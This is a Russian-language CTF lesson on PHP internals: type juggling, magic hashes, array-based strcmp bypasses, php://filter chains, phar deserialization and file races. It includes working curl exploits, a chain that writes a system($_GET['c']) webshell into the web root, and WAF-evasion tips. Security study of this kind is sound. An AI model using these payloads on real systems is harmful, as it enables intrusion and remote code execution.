---
id: web-php-tricks
title: "PHP internals для CTF: type juggling, magic hashes, filter chains, phar"
category: web
parent: web-deser-expert
difficulty: expert
order: 3
tags: [php, type-juggling, magic-hash, filter-chain, phar, ctf]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "PHP-специфика для CTF: type juggling и magic hashes, обход сравнений, filter chains до RCE, phar-десериализация, race в файлах."
---

PHP «магия» — набор особенностей языка, которые регулярно дают обходы на CTF и в реальных приложениях: нестрогие сравнения (`==`), «магические» хеши, поведение `strcmp`/`in_array`, цепочки `php://filter`, авто-десериализация `phar://`. Это не отдельный класс уязвимостей, а инструментарий, который применяется поверх LFI, auth-байпасов и десериализации. Урок — про практические трюки с командами.

## Type juggling (нестрогое сравнение)

В PHP `==` приводит типы. `"0e123" == "0e456"` → `true` (обе строки — «0 в степени», приводятся к `0`). Если код сравнивает хеши/токены через `==`, это обход:

```php
if ($_POST['password'] == $stored_hash) { ... }   // уязвимо
if (hash_equals($stored_hash, $input)) { ... }    // безопасно
```

Типовые пары: `0 == "a"` (в PHP 7), `"1" == "01"`, `NULL == ""`, `"0e1" == "0e2"`. В PHP 8 `0 == "a"` стало `false`, но `"0e1" == "0e2"` по-прежнему `true`.

## Magic hashes

Строки вида `0e` + цифры, чей MD5/SHA1 тоже начинается с `0e` и состоит из цифр, «равны» друг другу. Известные значения:

| Хеш | Значение |
|-----|----------|
| MD5 | `240610708` → `0e462097431906509019562988736854` |
| MD5 | `QNKCDZO` → `0e830400451993494058024219903391` |
| MD5 | `aabg7XSs` → `0e087386482136013740957780965295` |
| SHA1 | `aaroZmOk` → `0e66507019969427134894567494305185566735` |
| SHA1 | `aaK1STfY` → `0e76658526655756207688271159624026011393` |

Если приложение сравнивает `md5($input) == md5($known)`, подставьте `240610708` — оба хеша «равны 0». Полный список — `PayloadsAllTheThings` (PHP juggling / magic hashes).

## Обход функций

- **`strcmp($a,$b) == 0`** — при передаче массива `strcmp` возвращает `NULL`, а `NULL == 0` → `true`. Payload: `password[]=x`.
- **`in_array($x, $arr)`** без третьего аргумента — нестрогое; `in_array(0, ["admin"])` → `true` (PHP 7).
- **`preg_match`** при массиве возвращает `false` (не `0`); если код проверяет `if (!preg_match(...))`, массив обходит проверку.
- **`intval`/`is_numeric`** — `0x1A`, `1e3`, ` 10` (пробелы) — вариации.
- **Переменные переменные / `extract()`** — перезапись важных переменных через `?GLOBALS[x]=...`.

## php://filter chains → RCE

Цепочка фильтров `iconv` дописывает произвольный PHP в поток, который исполняет `include` — RCE без `allow_url_include` и без загрузки файла:

```bash
python3 php_filter_chain_generator.py --chain '<?=`id`;?>'
curl -s "https://app.example/?page=$(python3 php_filter_chain_generator.py --chain '<?=`id`;?>' | tail -1)"
```

(Подробно — в `web-php-wrappers`.) Это самый надёжный способ превратить LFI в RCE на современном PHP.

## phar:// десериализация

PHP автоматически десериализует **метаданные phar** при обращении к `phar://` — в том числе через обычные файловые функции (`file_exists`, `getimagesize`, `is_file`, `stat`, `fopen`). Поэтому даже без явного `unserialize` можно получить RCE, если есть загрузка файла (или существующий phar) и хоть одна файловая функция с управляемым путём:

```bash
./phpggc -p phar -o exploit.phar Monolog/RCE1 system id
curl -s "https://app.example/?file=phar://uploads/exploit.phar/test"
```

Важно: phar можно замаскировать под картинку (stub `GIF89a`), а расширение неважно — важен контент.

## Прочие трюки

- **Строковая инкрементация.** `$a='a'; $a++;` → `'b'`; `$a='z'; $a++;` → `'aa'` — используется в «preg_replace /e»-подобных и в обходе фильтров.
- **`__PHP_Incomplete_Class`** — при `unserialize` без класса.
- **`create_function`/`preg_replace /e`** (старые PHP) — RCE.
- **`assert()`** со строкой (PHP < 8) — исполняет код.
- **`session.upload_progress`** — запись произвольного файла в temp при LFI.
- **`/proc/self/environ`** — инъекция в User-Agent, читаемая через LFI.

## Разобранный пример: обход логина через juggling

Код: `if (md5($pass) == $stored)`. `$stored` начинается с `0e` (magic hash).

```bash
curl -s -X POST https://app.example/login --data 'user=admin&pass=240610708'
# md5('240610708') = 0e4620... -> == 0e... -> true
```

## Разобранный пример: strcmp bypass

Код: `if (strcmp($_POST['pass'], $secret) == 0)`. Передаём массив:

```bash
curl -s -X POST https://app.example/login --data 'user=admin&pass[]=x'
# strcmp(array,string) -> NULL; NULL == 0 -> true
```

## Разобранный пример: phar RCE через file_exists

Шаг 1 — генерируем phar с payload `phpggc -p phar -o p.phar Monolog/RCE1 system id`.
Шаг 2 — загружаем файл в `/uploads/p.jpg` (маскируем под картинку).
Шаг 3 — триггерим любую файловую функцию с `phar://`:

```bash
curl -s "https://app.example/avatar?src=phar://uploads/p.jpg/x"
```

Шаг 4 — метаданные десериализуются → цепочка → RCE.

## Инструменты

- **`php_filter_chain_generator`** — цепочки для RCE.
- **`phpggc`** — phar/POP payload.
- **`php -r`** — локальная проверка трюков.
- **`PayloadsAllTheThings`** — magic hashes и juggling-пары.
- **Burp** — доставка и перебор.

## Что дальше / decision

1. Сравнение хешей/токенов через `==` → magic hash / juggling.
2. Функция `strcmp`/`preg_match` с вводом → попробуйте массив (`param[]=x`).
3. Есть LFI → `php://filter` (чтение) или filter chain (RCE).
4. Есть загрузка файла → `phar://`-триггер через файловую функцию.
5. Дальше — устойчивый канал + read-back.

## Частые ошибки

- **Проверять juggling только на PHP 8.** `0 == "a"` изменилось; `0e`-пары всё ещё работают.
- **Забыть про массивы.** `param[]=` ломает `strcmp`/`preg_match`.
- **Считать phar безобидным.** Любая файловая функция триггерит десериализацию.
- **Пытаться читать исходник обычным путём.** Нужен `php://filter`.
- **Ломать прод.** RCE — только с согласия.

## Полный разбор: php://filter chain до RCE (с выводом)

Самый надёжный способ превратить LFI в RCE на современном PHP — цепочка фильтров `iconv`, которая дописывает произвольный код в поток, а затем `include` его исполняет. Ни `allow_url_include`, ни загрузка файла не нужны.

Шаг 1. Находим параметр, уходящий в `include`/`require`/`file_get_contents`:

```bash
curl -s 'https://app.example/?page=about.php' | grep -o 'About'
# About
curl -s 'https://app.example/?page=/etc/passwd' | head -1
# root:x:0:0:root:/root:/bin/bash
# -> LFI подтверждён
```

Шаг 2. Генерируем цепочку, которая исполняет `system('id')`:

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?=`id`;?>' | tail -1 > chain.txt
wc -c chain.txt
# 9812 chain.txt
```

Шаг 3. Отправляем цепочку в параметр:

```bash
curl -s "https://app.example/?page=$(cat chain.txt)" | head
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Шаг 4. Сразу строим устойчивый канал (webshell), а не гоняем `id` через длинную цепочку:

```bash
python3 php_filter_chain_generator.py --chain '<?=`echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ | base64 -d > /var/www/html/s.php`;?>' | tail -1 > chain.txt
curl -s "https://app.example/?page=$(cat chain.txt)" >/dev/null
curl -s 'https://app.example/s.php?c=id'
# uid=33(www-data) ...
```

Важно: цепочка очень длинная (иногда 8–30 КБ) — URL может упереться в лимит. Тогда отправляем `POST` в теле или через `-G --data-urlencode`.

## Reference-таблица: PHP-функции и их слабые места

| Функция/конструкция | Проблема | Payload/условие |
|---------------------|----------|-----------------|
| `==` для хешей/токенов | type juggling, magic hash | `240610708`, `QNKCDZO` |
| `strcmp($a,$b)==0` | массив → NULL → `NULL==0` | `pass[]=x` |
| `in_array($x,$arr)` без strict | нестрогое сравнение | `in_array(0,["admin"])` |
| `preg_match` c массивом | возвращает `false` | `param[]=x` при `!preg_match` |
| `is_numeric`/`intval` | `0x1A`, `1e3`, пробелы | обход числовых проверок |
| `extract()`/`$$var` | перезапись переменных | `?GLOBALS[x]=..` |
| `unserialize`/`phar://` | десериализация POP | `phpggc` payload |
| `include`/`require` | LFI → filter chain RCE | `php_filter_chain_generator` |
| `file_exists`/`getimagesize` | триггер phar | `phar://uploads/x.jpg/f` |
| `assert()` (PHP<8) | исполнение строки | `assert($_GET[x])` |
| `create_function`/`preg_replace /e` | RCE (старые PHP) | `preg_replace('/x/e',...)` |
| `session.upload_progress` | запись temp-файла | LFI в `/tmp/sess_*` |

## Обход WAF и фильтров на PHP-трюках

- **Кодирование `0e`:** если фильтр режет `240610708`, подберите другой magic hash (`aabg7XSs`), а для SHA1 — `aaroZmOk`.
- **Массив вместо строки:** WAF часто пропускает `pass[]=x` (не видит строкового значения), а `strcmp`/`preg_match` при этом ломаются.
- **Регистр и пробелы:** `0x1A` vs `0X1a`, `1e3` vs `1E3`, ведущие пробелы `" 10"` — `is_numeric` их принимает.
- **phar под картинкой:** stub `GIF89a` в начале файла + расширение `.jpg` — фильтры по расширению/content-type пропускают, но `phar://` всё равно десериализует.
- **Обёртка-фильтр:** если `php://` заблокирован, попробуйте `php://filter/convert.base64-encode/resource=` — иногда фильтр ловит только `php://input`.
- **Разные разделители:** `phar://./uploads/x` vs `phar:///uploads/x`, URL-кодирование `%2f`.

## Разобранный пример: LFI → session upload progress

Если прямой `include` фильтрует `<?`, а `allow_url_include=Off`:

```bash
# 1. PHP пишет прогресс-файл при загрузке, если session.upload_progress.enabled=On
curl -s -F 'PHP_SESSION_UPLOAD_PROGRESS=<?=`id`;?>' -F 'f=@x' \
     -b 'PHPSESSID=aaa' 'https://app.example/upload'
# 2. Читаем /tmp/sess_aaa через LFI
curl -s 'https://app.example/?page=/tmp/sess_aaa'
# uid=33(www-data) ...
```

## Что делать дальше / решение

1. **Сравнение через `==`** → magic hash / juggling-пара.
2. **`strcmp`/`preg_match`/`in_array` с вводом** → массив (`param[]=x`).
3. **Есть LFI** → `php://filter` для чтения исходников, filter chain для RCE.
4. **Есть загрузка файла** → `phar://`-триггер через любую файловую функцию.
5. **Есть `unserialize`** → POP-цепочка `phpggc` под известный фреймворк.
6. Далее — устойчивый канал (webshell/сессия) + read-back, не гоняйте `id` по длинной цепочке каждый раз.

## Race condition и symlink в файловых операциях

PHP-код, который проверяет файл (`is_uploaded_file`, `file_exists`) и затем его использует, уязвим к гонке (TOCTOU): между проверкой и использованием файл можно подменить symlink'ом на `/etc/passwd` или на скрипт. На CTF это даёт чтение произвольных файлов и иногда RCE.

```bash
# пока сервер проверяет и удаляет tmp-файл, подменяем его symlink'ом
while :; do ln -sf /etc/passwd /tmp/upload_target 2>/dev/null; done &
```

Также `move_uploaded_file` с предсказуемым именем + `include` дают прямую загрузку исполняемого файла. Держите под рукой `inotifywait` для точного тайминга подмены.

## Квиз

```quiz
- question: 'Почему "0e123" == "0e456" истинно?'
  options:
    - "Строки равны"
    - "Обе интерпретируются как 0 в научной нотации"
    - "PHP сравнивает длину"
    - "Это баг"
  answer: 1
  explanation: "Loose-сравнение приводит к числу."
- question: "Как обойти strcmp с массивом?"
  options:
    - "Передать строку"
    - "Передать pass[]=x -> strcmp вернёт null/false"
    - "Использовать POST"
    - "Добавить cookie"
  answer: 1
  explanation: "strcmp(array) не сравнивает строки."
- question: "Что такое magic hash?"
  options:
    - "Хеш от пароля"
    - "Строка, хеш которой вида 0e\d+ (приводится к 0)"
    - "SHA-256"
    - "Base64"
  answer: 1
  explanation: "Используется против ==."
- question: "Чем опасен phar://?"
  options:
    - "Он медленный"
    - "Авто-десериализует метаданные при файловых операциях"
    - "Он шифрует"
    - "Он кеширует"
  answer: 1
  explanation: "Триггер даже без unserialize."
- question: 'В какой версии PHP "abc" == 0 стало false?'
  options:
    - "5.6"
    - "8.0"
    - "7.0"
    - "7.4"
  answer: 1
  explanation: "PHP 8 изменил сравнение строки с числом."
```

## Где пригодится

- **CTF (Web):** PHP-задачи почти всегда с этими трюками.
- **Bug bounty:** обход логики/сравнений.
- **Пентест:** аудит PHP-кода.
- **Работа (AppSec):** strict-сравнения, `===`, отказ от phar/unserialize, обновление PHP.
